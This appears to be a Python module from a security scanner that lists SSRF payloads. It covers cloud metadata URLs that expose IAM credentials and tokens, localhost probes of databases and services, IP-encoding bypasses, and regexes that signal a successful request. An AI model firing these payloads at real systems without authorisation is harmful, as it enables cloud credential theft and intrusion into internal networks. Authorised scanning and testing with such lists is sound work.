"""SSRF payloads and cloud metadata endpoints."""

# ── Cloud metadata service endpoints ──────────────────────────────────────────
SSRF_CLOUD = [
    # AWS IMDS v1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/meta-data/hostname",
    # AWS IMDS v2 token endpoint (blind probe — 405 = exists)
    "http://169.254.169.254/latest/api/token",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
]

# ── Internal network probes ────────────────────────────────────────────────────
SSRF_INTERNAL = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    # Internal services
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:6379/",    # Redis
    "http://127.0.0.1:27017/",   # MongoDB
    "http://127.0.0.1:5432/",    # PostgreSQL
    "http://127.0.0.1:9200/",    # Elasticsearch
    "http://127.0.0.1:8500/",    # Consul
    "http://127.0.0.1:4040/",    # ngrok
    # Bypass: decimal encoding
    "http://2130706433/",         # 127.0.0.1
    "http://0x7f000001/",         # 127.0.0.1 hex
    # IPv6
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
]

# ── Signature strings indicating SSRF success ─────────────────────────────────
SSRF_INTERNAL_SIGS = [
    r"ami-id",
    r"instance-id",
    r"local-ipv4",
    r"security-credentials",
    r"computeMetadata",
    r"iam\.amazonaws\.com",
    r"\{.*\"access_key",
    r"127\.0\.0\.1",
    r"localhost",
    r"<html",
    r"<!doctype",
    r"redis_version",
    r"mongoclient",
    r"elasticsearch",
]
